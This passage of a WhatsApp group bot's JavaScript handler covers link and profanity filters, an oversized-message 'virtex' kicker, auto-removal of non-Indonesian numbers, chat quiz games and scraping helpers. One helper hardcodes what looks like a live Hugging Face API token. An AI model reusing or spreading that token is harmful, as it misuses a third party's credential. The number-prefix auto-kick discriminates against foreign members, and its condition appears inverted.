"𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨 𝐍𝐨 𝐂𝐨𝐮𝐧𝐭𝐞𝐫"
]
let { key } = await qio.sendMessage(m.chat, {text: '𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨'})

const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}

for (let i = 0; i < gen2.length; i++) {
await sleep(10)
await qio.sendMessage(m.chat, {text: gen2[i], edit: key });
}
}

//=================================================//
const qioreply = async (teks) => {
await sleep(500)
let thumbnails = [cok, bangke]
let randomIndex = Math.floor(Math.random() * thumbnails.length)
let selectedThumbnail = thumbnails[randomIndex]
return qio.sendMessage(m.chat, {
contextInfo: {
mentionedJid: [m.sender],
externalAdReply: {
showAdAttribution: false,
renderLargerThumbnail: false,
title: `Alfin Faridh Taufiqiy`,
body: `${ucapanWaktu} ${m.pushName} 👋`,
previewType: "VIDEO",
thumbnail: selectedThumbnail,
sourceUrl: `https://www.instagram.com/coreinpin/`,
mediaUrl: `https://www.instagram.com/coreinpin/`
}
},
text: teks
}, {
quoted: m
})
await sleep(500)
}
//=================================================//

// Anti Link
if (AntiLink) {
if (budy.toLowerCase().includes("chat.whatsapp.com/")){
if (!isBotAdmins) return m.reply(`${mess.botAdmin}, _Untuk menendang orang yang mengirim link group_`)
let gclink = (`https://chat.whatsapp.com/`+await qio.groupInviteCode(m.chat))
let isLinkThisGc = new RegExp(gclink, 'i')
let isgclink = isLinkThisGc.test(m.text)
if (isgclink) return qio.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\nAnda tidak akan ditendang oleh bot karena yang Anda kirim adalah link ke grup ini`})
if (isAdmins) return qio.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\nAdmin sudah mengirimkan link, admin bebas memposting link apapun`})
if (isDeveloper) return qio.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\Owner telah mengirim link, owner bebas memposting link apa pun`})
await qio.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
qio.sendMessage(m.chat, {text:`\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\n@${m.sender.split("@")[0]} Jangan kirim group link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
}
}
 // Antiwame by ঔৣ⃕᭝𝐀𝐥𝐰𝐚𝐲𝐬𝐃𝐢𝐱𝐳᭄o
if (AntiWame)
if (budy.toLowerCase().includes("wa.me")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Wa.me Link Terdeteksi 」\`\`\`\n\nAdmin sudah kirim link wa.me, admin bebas kirim link apapun`
if (isAdmins) return qioreply(bvl)
if (mek.key.fromMe) return qioreply(bvl)
if (isDeveloper) return qioreply(bvl)
kice = m.sender
await qio.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*qio.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
qio.sendMessage(m.chat, {text:`\`\`\`「 Wa.me Link Terdeteksi 」\`\`\`\n\n@${kice.split("@")[0]} Jangan kirim wa.me link di group ini`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
}
//antivirtex by ঔৣ⃕᭝𝐀𝐥𝐰𝐚𝐲𝐬𝐃𝐢𝐱𝐳᭄o 
  if (AntiVirtex) {
  if (budy.length > 3500) {
  if (!isBotAdmins) return qioreply(mess.botAdmin)
  await qio.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
qio.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
qio.sendMessage(m.chat, {text:`\`\`\`「 Virus Terdeteksi 」\`\`\`\n\n${pushname} Telah ditendang karena mengirim virus di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
  }
  }
//anti bad words by ঔৣ⃕᭝𝐀𝐥𝐰𝐚𝐲𝐬𝐃𝐢𝐱𝐳᭄o
if (AntiToxic && !budy.includes("deletezxcwords") && !budy.includes("delzxcwords"))
if (zxcwords.some(word => budy.toLowerCase().includes(word))){
if (!isBotAdmins) return
bvl = `\`\`\`「 Kata Kasar Terdeteksi 」\`\`\`\n\nAdmin bebas menggunakan kata kasar`
if (isAdmins) return qioreply(bvl)
if (mek.key.fromMe) return qioreply(bvl)
if (isDeveloper) return qioreply(bvl)
await qio.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*qio.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
qio.sendMessage(m.chat, {text:`\`\`\`「 Kata Kasar Terdeteksi 」\`\`\`\n\n${pushname} Mohon tidak menggunakan kata kasar di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antiasing by ঔৣ⃕᭝𝐀𝐥𝐰𝐚𝐲𝐬𝐃𝐢𝐱𝐳᭄o
if (m.isGroup && isBotAdmins && AntiAsing) {
let member = await participants.map((x) => x.id)
for (let i = 0; i < participants.length; i++) {
if (member[i].slice(0, 2) !== "62") {
let usersId = await participants.find((u) => u.id == member[i])
if (!usersId.groupAdmins && !isDeveloper) {
} else
await qio.groupParticipantsUpdate(m.chat, [member[i]], "remove")
await sleep(1000)
}
}
}
//antilink youtube video by ঔৣ⃕᭝𝐀𝐥𝐰𝐚𝐲𝐬𝐃𝐢𝐱𝐳᭄o
if (AntiLinkYoutubeVid)
if (budy.toLowerCase().includes("youtu.be")){
if (!isBotAdmins) return
bvl = `\`\`\`「 YouTube Link Terdeteksi 」\`\`\`\n\nAdmin Dan Kontributor Bot bebas kirim link apapun `
if (isAdmins) return qioreply(bvl)
if (mek.key.fromMe) return qioreply(bvl)
if (isDeveloper) return qioreply(bvl)
await qio.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*qio.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
qio.sendMessage(m.chat, {text:`\`\`\`「 YouTube Video Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim youtube video link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink youtube channel by ঔৣ⃕᭝𝐀𝐥𝐰𝐚𝐲𝐬𝐃𝐢𝐱𝐳᭄o
if (AntiLinkYoutubeChannel)
if (budy.toLowerCase().includes("youtube.com")){
if (!isBotAdmins) return
bvl = `\`\`\`「 YouTube Link Terdeteksi 」\`\`\`\n\nAdmin Dan Kontributor Bot bebas kirim link apapun `
if (isAdmins) return qioreply(bvl)
if (mek.key.fromMe) return qioreply(bvl)
if (isDeveloper) return qioreply(bvl)
await qio.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*qio.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
qio.sendMessage(m.chat, {text:`\`\`\`「 YouTube Channel Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim youtube channel link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink instagram by ঔৣ⃕᭝𝐀𝐥𝐰𝐚𝐲𝐬𝐃𝐢𝐱𝐳᭄o
if (AntiLinkInstagram)
if (budy.toLowerCase().includes("instagram.com")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Instagram Link Terdeteksi 」\`\`\`\n\nAdmin Dan Kontributor Bot bebas kirim link apapun `
if (isAdmins) return qioreply(bvl)
if (mek.key.fromMe) return qioreply(bvl)
if (isDeveloper) return qioreply(bvl)
await qio.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*qio.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
qio.sendMessage(m.chat, {text:`\`\`\`「 Instagram Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim instagram link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink facebook by ঔৣ⃕᭝𝐀𝐥𝐰𝐚𝐲𝐬𝐃𝐢𝐱𝐳᭄o
if (AntiLinkFacebook)
if (budy.toLowerCase().includes("facebook.com")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Facebook Link Terdeteksi 」\`\`\`\n\nAdmin Dan Kontributor Bot bebas kirim link apapun `
if (isAdmins) return qioreply(bvl)
if (mek.key.fromMe) return qioreply(bvl)
if (isDeveloper) return qioreply(bvl)
await qio.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*qio.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
qio.sendMessage(m.chat, {text:`\`\`\`「 Facebook Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim facebook link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink telegram by ঔৣ⃕᭝𝐀𝐥𝐰𝐚𝐲𝐬𝐃𝐢𝐱𝐳᭄o
if (AntiLinkTelegram)
if (budy.toLowerCase().includes("t.me")){
if (AntiLinkTelegram)
if (!isBotAdmins) return
bvl = `\`\`\`「 Telegram Link Terdeteksi 」\`\`\`\n\nAdmin Dan Kontributor Bot bebas kirim link apapun `
if (isAdmins) return qioreply(bvl)
if (mek.key.fromMe) return qioreply(bvl)
if (isDeveloper) return qioreply(bvl)
await qio.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*qio.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
qio.sendMessage(m.chat, {text:`\`\`\`「 Telegram Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim telegram link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink tiktok by ঔৣ⃕᭝𝐀𝐥𝐰𝐚𝐲𝐬𝐃𝐢𝐱𝐳᭄o
if (AntiLinkTiktok)
if (budy.toLowerCase().includes("tiktok.com")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Tiktok Link Terdeteksi 」\`\`\`\n\nAdmin Dan Kontributor Bot bebas kirim link apapun `
if (isAdmins) return qioreply(bvl)
if (mek.key.fromMe) return qioreply(bvl)
if (isDeveloper) return qioreply(bvl)
await qio.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*qio.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
qio.sendMessage(m.chat, {text:`\`\`\`「 Tiktok Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim tiktok link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink twitter by ঔৣ⃕᭝𝐀𝐥𝐰𝐚𝐲𝐬𝐃𝐢𝐱𝐳᭄o
if (AntiLinkTwitter)
if (budy.toLowerCase().includes("twitter.com")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Twitter Link Terdeteksi 」\`\`\`\n\nAdmin Dan Kontributor Bot bebas kirim link apapun `
if (isAdmins) return qioreply(bvl)
if (mek.key.fromMe) return qioreply(bvl)
if (isDeveloper) return qioreply(bvl)
await qio.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*qio.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
qio.sendMessage(m.chat, {text:`\`\`\`「 Tiktok Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim twitter link di grup ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink all by ঔৣ⃕᭝𝐀𝐥𝐰𝐚𝐲𝐬𝐃𝐢𝐱𝐳᭄o
if (AntiLinkAll)
if (budy.toLowerCase().includes("http")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Link Terdeteksi 」\`\`\`\n\nAdmin bebas kirim link apapun`
if (isAdmins) return qioreply(bvl)
if (mek.key.fromMe) return qioreply(bvl)
if (isDeveloper) return qioreply(bvl)
await qio.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
/*qio.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
qio.sendMessage(m.chat, {text:`\`\`\`「 Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}

//=================================================//

// GAME
if (tebakgambar.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakgambar[m.sender.split('@')[0]]
if (budy.toLowerCase() == "nyerah") {
await qioreply('*Anda Telah menyerah*')
delete tebakgambar[m.sender.split('@')[0]]
} else if (budy.toLowerCase() == jawaban) {
await qio.sendText(m.chat, `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉`, m)
delete tebakgambar[m.sender.split('@')[0]]
} else qioreply('*Jawaban Salah!*')
}

if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = kuismath[m.sender.split('@')[0]]
if (budy.toLowerCase() == "nyerah") {
await qioreply('*Anda Telah menyerah*')
delete kuismath[m.sender.split('@')[0]]
} else if (budy.toLowerCase() == jawaban) {
await m.reply(`🎮 Kuis Matematika  🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? kirim ${prefix}math mode`)
delete kuismath[m.sender.split('@')[0]]
} else qioreply('*Jawaban Salah!*')
}

if (tebakasahotak.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakasahotak[m.sender.split('@')[0]]
if (budy.toLowerCase() == "nyerah") {
await qioreply('*Anda Telah menyerah*')
delete tebakasahotak[m.sender.split('@')[0]]
} else if (budy.toLowerCase() == jawaban) {
await qio.sendText(m.chat, `🎮 Asah Otak 🎮\n\nJawaban Benar 🎉`, m)
delete tebakasahotak[m.sender.split('@')[0]]
} else qioreply('*Jawaban Salah!*')
}

if (tebaksiapakahaku.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaksiapakahaku[m.sender.split('@')[0]]
if (budy.toLowerCase() == "nyerah") {
await qioreply('*Anda Telah menyerah*')
delete tebaksiapakahaku[m.sender.split('@')[0]]
} else if (budy.toLowerCase() == jawaban) {
await qio.sendText(m.chat, `🎮 Siapakah Aku 🎮\n\nJawaban Benar 🎉`, m)
delete tebaksiapakahaku[m.sender.split('@')[0]]
} else qioreply('*Jawaban Salah!*')
}

if (tebaksusunkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaksusunkata[m.sender.split('@')[0]]
if (budy.toLowerCase() == "nyerah") {
await qioreply('*Anda Telah menyerah*')
delete tebaksusunkata[m.sender.split('@')[0]]
} else if (budy.toLowerCase() == jawaban) {
await qio.sendText(m.chat, `🎮 Susun Kata 🎮\n\nJawaban Benar 🎉`, m)
delete tebaksusunkata[m.sender.split('@')[0]]
} else qioreply('*Jawaban Salah!*')
}

if (tebakbendera.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakbendera[m.sender.split('@')[0]]
if (budy.toLowerCase() == "nyerah") {
await qioreply('*Anda Telah menyerah*')
delete tebakbendera[m.sender.split('@')[0]]
} else if (budy.toLowerCase() == jawaban) {
await qio.sendText(m.chat, `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉`, m)
delete tebakbendera[m.sender.split('@')[0]]
} else qioreply('*Jawaban Salah!*')
}

if (tebakbendera2.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakbendera2[m.sender.split('@')[0]]
if (budy.toLowerCase() == "nyerah") {
await qioreply('*Anda Telah menyerah*')
delete tebakbendera2[m.sender.split('@')[0]]
} else if (budy.toLowerCase() == jawaban) {
await qio.sendText(m.chat, `🎮 Tebak Bendera 🎮\n\nJawaban Benar 🎉`, m)
delete tebakbendera2[m.sender.split('@')[0]]
} else qioreply('*Jawaban Salah!*')
}

if (tebakkabupaten.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakkabupaten[m.sender.split('@')[0]]
if (budy.toLowerCase() == "nyerah") {
await qioreply('*Anda Telah menyerah*')
delete tebakkabupaten[m.sender.split('@')[0]]
} else if (budy.toLowerCase() == jawaban) {
await qio.sendText(m.chat, `🎮 Tebak Kabupaten 🎮\n\nJawaban Benar 🎉`, m)
delete tebakkabupaten[m.sender.split('@')[0]]
} else qioreply('*Jawaban Salah!*')
}

if (tebakkimia.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakkimia[m.sender.split('@')[0]]
if (budy.toLowerCase() == "nyerah") {
await qioreply('*Anda Telah menyerah*')
delete tebakkimia[m.sender.split('@')[0]]
} else if (budy.toLowerCase() == jawaban) {
await qio.sendText(m.chat, `🎮 Tebak Kimia 🎮\n\nJawaban Benar 🎉`, m)
delete tebakkimia[m.sender.split('@')[0]]
} else qioreply('*Jawaban Salah!*')
}

if (tebaktekateki.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaktekateki[m.sender.split('@')[0]]
if (budy.toLowerCase() == "nyerah") {
await qioreply('*Anda Telah menyerah*')
delete tebaktekateki[m.sender.split('@')[0]]
} else if (budy.toLowerCase() == jawaban) {
await qio.sendText(m.chat, `🎮 Teka Teki 🎮\n\nJawaban Benar 🎉`, m)
delete tebaktekateki[m.sender.split('@')[0]]
} else qioreply('*Jawaban Salah!*')
}

if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaklagu[m.sender.split('@')[0]]
if (budy.toLowerCase() == "nyerah") {
await qioreply('*Anda Telah menyerah*')
delete tebaklagu[m.sender.split('@')[0]]
} else if (budy.toLowerCase() == jawaban) {
await qio.sendText(m.chat, `🎮 Tebak Lagu 🎮\n\nJawaban Benar 🎉`, m)
delete tebaklagu[m.sender.split('@')[0]]
} else qioreply('*Jawaban Salah!*')
}

if (tebakkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakkata[m.sender.split('@')[0]]
if (budy.toLowerCase() == "nyerah") {
await qioreply('*Anda Telah menyerah*')
delete tebakkata[m.sender.split('@')[0]]
} else if (budy.toLowerCase() == jawaban) {
await qio.sendText(m.chat, `🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉`, m)
delete tebakkata[m.sender.split('@')[0]]
} else qioreply('*Jawaban Salah!*')
}

if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakkalimat[m.sender.split('@')[0]]
if (budy.toLowerCase() == "nyerah") {
await qioreply('*Anda Telah menyerah*')
delete tebakkalimat[m.sender.split('@')[0]]
} else if (budy.toLowerCase() == jawaban) {
await qio.sendText(m.chat, `🎮 Tebak Kalimat 🎮\n\nJawaban Benar 🎉`, m)
delete tebakkalimat[m.sender.split('@')[0]]
} else qioreply('*Jawaban Salah!*')
}

if (tebaklirik.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaklirik[m.sender.split('@')[0]]
if (budy.toLowerCase() == "nyerah") {
await qioreply('*Anda Telah menyerah*')
delete tebaklirik[m.sender.split('@')[0]]
} else if (budy.toLowerCase() == jawaban) {
await qio.sendText(m.chat, `🎮 Tebak Lirik 🎮\n\nJawaban Benar 🎉`, m)
delete tebaklirik[m.sender.split('@')[0]]
} else qioreply('*Jawaban Salah!*')
}

if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaktebakan[m.sender.split('@')[0]]
if (budy.toLowerCase() == "nyerah") {
await qioreply('*Anda Telah menyerah*')
delete tebaktebakan[m.sender.split('@')[0]]
} else if (budy.toLowerCase() == jawaban) {
await qio.sendText(m.chat, `🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉`, m)
delete tebaktebakan[m.sender.split('@')[0]]
} else qioreply('*Jawaban Salah!*')
}

this.game = this.game ? this.game : {}
let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
if (room) {
let ok
let isWin = !1
let isTie = !1
let isSurrender = !1
if (!/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i.test(m.text)) return
isSurrender = !/^[1-9]$/.test(m.text)
if (m.sender !== room.game.currentTurn) {
if (!isSurrender) return !0
}
if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
qioreply({
'-3': 'Game telah berakhir',
'-2': 'Invalid',
'-1': 'Posisi Invalid',
0: 'Posisi Invalid',
} [ok])
return !0
}
if (m.sender === room.game.winner) isWin = true
else if (room.game.board === 511) isTie = true
let arr = room.game.render().map(v => {
return {
X: '❌',
O: '⭕',
1: '1️⃣',
2: '2️⃣',
3: '3️⃣',
4: '4️⃣',
5: '5️⃣',
6: '6️⃣',
7: '7️⃣',
8: '8️⃣',
9: '9️⃣',
} [v]
})
if (isSurrender) {
room.game._currentTurn = m.sender === room.game.playerX
isWin = true
}
let winner = isSurrender ? room.game.currentTurn : room.game.winner
let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Menang!` : isTie ? `Game berakhir` : `Giliran ${['', ''][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
: @${room.game.playerX.split('@')[0]}
: @${room.game.playerO.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
if (room.x !== room.o) qio.sendText(room.x, str, m, {
mentions: parseMention(str)
})
qio.sendText(room.o, str, m, {
mentions: parseMention(str)
})
if (isTie || isWin) {
delete this.game[room.id]
}
}

if (m.isGroup && !m.key.fromMe) {
let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
for (let ment of mentionUser) {
if (afk.checkAfkUser(ment, _afk)) {
let getId2 = afk.getAfkId(ment, _afk)
let getReason2 = afk.getAfkReason(getId2, _afk)
let getTimee = Date.now() - afk.getAfkTime(getId2, _afk)
let heheh2 = ms(getTimee)
m.reply(`Jangan tag, dia sedang afk\n\n*Reason :* ${getReason2}`)
}
}
if (afk.checkAfkUser(m.sender, _afk)) {
let getId = afk.getAfkId(m.sender, _afk)
let getReason = afk.getAfkReason(getId, _afk)
let getTime = Date.now() - afk.getAfkTime(getId, _afk)
let heheh = ms(getTime)
_afk.splice(afk.getAfkPosition(m.sender, _afk), 1)
fs.writeFileSync('dtbs/afk-user.json', JSON.stringify(_afk))
qio.sendTextWithMentions(m.chat, `@${m.sender.split('@')[0]} telah kembali dari afk`, m)
}
}

let anjay = `\``

this.suit = this.suit ? this.suit : {}
let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
if (roof) {
let win = ''
let tie = false
if (m.sender == roof.p2 && /^(acc(ept)?|terima|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
if (/^(tolak|gamau|nanti|n|ga(k.)?bisa)/i.test(m.text)) {
qio.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} menolak suit, suit dibatalkan`, m)
delete this.suit[roof.id]
return !0
}
roof.status = 'play'
roof.asal = m.chat
clearTimeout(roof.waktu)
//delete roof[roof.id].waktu
qio.sendText(m.chat, `Suit telah dikirimkan ke chat

@${roof.p.split`@`[0]} dan 
@${roof.p2.split`@`[0]}

Silahkan pilih suit di chat masing"
klik https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
if (!roof.pilih) qio.sendText(roof.p, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
if (!roof.pilih2) qio.sendText(roof.p2, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
roof.waktu_milih = setTimeout(() => {
if (!roof.pilih && !roof.pilih2) qio.sendText(m.chat, `Kedua pemain tidak niat main,\nSuit dibatalkan`)
else if (!roof.pilih || !roof.pilih2) {
win = !roof.pilih ? roof.p2 : roof.p
qio.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`, m)
}
delete this.suit[roof.id]
return !0
}, roof.timeout)
}
let jwb = m.sender == roof.p
let jwb2 = m.sender == roof.p2
let g = /gunting/i
let b = /batu/i
let k = /kertas/i
let reg = /^(gunting|batu|kertas)/i
if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
roof.pilih = reg.exec(m.text.toLowerCase())[0]
roof.text = m.text
m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`)
if (!roof.pilih2) qio.sendText(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
}
if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
roof.text2 = m.text
m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
if (!roof.pilih) qio.sendText(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
}
let stage = roof.pilih
let stage2 = roof.pilih2
if (roof.pilih && roof.pilih2) {
clearTimeout(roof.waktu_milih)
if (b.test(stage) && g.test(stage2)) win = roof.p
else if (b.test(stage) && k.test(stage2)) win = roof.p2
else if (g.test(stage) && k.test(stage2)) win = roof.p
else if (g.test(stage) && b.test(stage2)) win = roof.p2
else if (k.test(stage) && b.test(stage2)) win = roof.p
else if (k.test(stage) && g.test(stage2)) win = roof.p2
else if (stage == stage2) tie = true
qio.sendText(roof.asal, `_*Hasil Suit*_${tie ? '\nSERI' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Menang \n` : ` Kalah \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Menang \n` : ` Kalah \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
delete this.suit[roof.id]
}
}

//=================================================//
async function ssweb(url, device = 'desktop'){
return new Promise((resolve, reject) => {
const base = 'https://www.screenshotmachine.com'
const param = {
url: url,
device: device,
cacheLimit: 0
}
axios({url: base + '/capture.php',
method: 'POST',
data: new URLSearchParams(Object.entries(param)),
headers: {
'content-type': 'application/x-www-form-urlencoded; charset=UTF-8'
}
}).then((data) => {
const cookies = data.headers['set-cookie']
if (data.data.status == 'success') {
axios.get(base + '/' + data.data.link, {
headers: {
'cookie': cookies.join('')
},
responseType: 'arraybuffer'
}).then(({ data }) => {
result = {
status: 200,
result: data
}
resolve(result)
})
} else {
reject({ status: 404, statuses: `Link Error`, message: data.data })
}
}).catch(reject)
})
}

//=================================================//
async function diff(data) {
const response = await fetch(
"https://api-inference.huggingface.co/models/stablediffusionapi/lyrielv16",
{
headers: { Authorization: "Bearer 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" },
method: "POST",
body: JSON.stringify(data),
}
)
const result = await response.blob();
let arrayBuffer = await result.arrayBuffer();
const buffer = Buffer.from(arrayBuffer, 'base64')
return buffer
}

async function styletext(teks) {
return new Promise((resolve, reject) => {
axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
.then(({ data }) => {
let $ = cheerio.load(data)
let hasil = []
$('table > tbody > tr').each(function (a, b) {
hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
})
resolve(hasil)
})
})
}

//=================================================//
async function ephoto(url, texk) {
let form = new FormData()
let gT = await axios.get(url, {
headers: {
"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
}
})
let $ = cheerio.load(gT.data)
let text = texk
let token = $("input[name=token]").val()
let build_server = $("input[name=build_server]").val()
let build_server_id = $("input[name=build_server_id]").val()
form.append("text[]", text)
form.append("token", token)
form.append("build_server", build_server)
form.append("build_server_id", build_server_id)
let res = await axios.post(url, form, {
headers: {
...form.getHeaders(),
Accept: "*/*",
"Accept-Language": "en-US,en;q=0.9",
"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
cookie: gT.headers["set-cookie"]?.join("; "),
}
});

//=================================================//
let $$ = cheerio.load(res.data)
let json = JSON.parse($$("input[name=form_value_input]").val())
json["text[]"] = json.text
delete json.text
let { data } = await axios.post("https://en.ephoto360.com/effect/create-image", new URLSearchParams(json), {
headers: {
"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
cookie: gT.headers["set-cookie"].join("; ")
}
})
return build_server + data.image
}
//=================================================//
